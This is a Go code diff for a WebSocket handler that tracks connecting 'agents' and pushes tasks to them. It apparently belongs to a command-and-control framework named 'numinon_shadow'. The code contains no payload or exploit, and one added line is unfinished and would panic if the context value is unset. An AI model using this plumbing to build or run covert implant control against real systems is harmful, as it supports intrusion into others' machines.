@@ -8,6 +8,7 @@ import (
 	"net/http"
 	"numinon_shadow/internal/agent/config"
 	"numinon_shadow/internal/models"
+	"numinon_shadow/internal/tracker"
 	"time"
 )
 
@@ -22,22 +23,29 @@ var upgrader = websocket.Upgrader{
 }
 
 func WSHandler(w http.ResponseWriter, r *http.Request) {
-	// (1) UPGRADE from HTTP/1.1 to WebSocket connection
+	// UPGRADE from HTTP/1.1 to WebSocket connection
 	conn, err := upgrader.Upgrade(w, r, nil)
 	if err != nil {
 		log.Println("WebSocket upgrade failed:", err)
 		return
 	}
-	defer conn.Close()
 
-	// (2) Extract Agent ID
+	// Extract Agent ID
 	agentID := r.Header.Get("Agent-ID")
 	if agentID == "" {
 		log.Println("Agent connected without an ID")
 		return
 	}
 
-	// (3) DETERMINE PROTOCOL
+	defer func() {
+		// Mark agent as disconnected when WebSocket closes
+		if AgentTracker != nil && agentID != "" {
+			AgentTracker.MarkDisconnected(agentID)
+		}
+		conn.Close()
+	}()
+
+	// DETERMINE PROTOCOL
 	var agentProtocol config.AgentProtocol
 
 	if r.TLS == nil {
@@ -46,12 +54,27 @@ func WSHandler(w http.ResponseWriter, r *http.Request) {
 		agentProtocol = config.WebsocketSecure
 	}
 
+	// Register WebSocket connection
+	if AgentTracker != nil {
+		listenerID := r.Context().Value("listenerID").(string) // You'll need to set this
+		err := AgentTracker.RegisterConnection(
+			agentID,
+			listenerID,
+			string(agentProtocol),
+			r.RemoteAddr,
+			tracker.TypeWebSocket,
+		)
+		if err != nil {
+			log.Printf("|⚠️ TRACKER| Failed to register WS connection: %v", err)
+		}
+	}
+
 	log.Printf("| 🧦 WEBSOCKET AGENT CONNECTED | ID: %s | Protocol: %s |\n", agentID, agentProtocol)
 
-	// (4) COMMAND ISSUANCE SIMULATOR (we'll delete this later)
+	// (4) COMMAND ISSUANCE SIMULATOR (delete this later)
 
-	// ------------------ NEW LOGIC: Start Tasking Goroutine ------------------
-	// This goroutine will be responsible for proactively pushing tasks to the agent.
+	// Start Tasking Goroutine
+	// This goroutine is responsible for proactively pushing tasks to the agent.
 	go func() {
 		for {
 			// 1. Wait for X seconds before attempting to issue a new task.
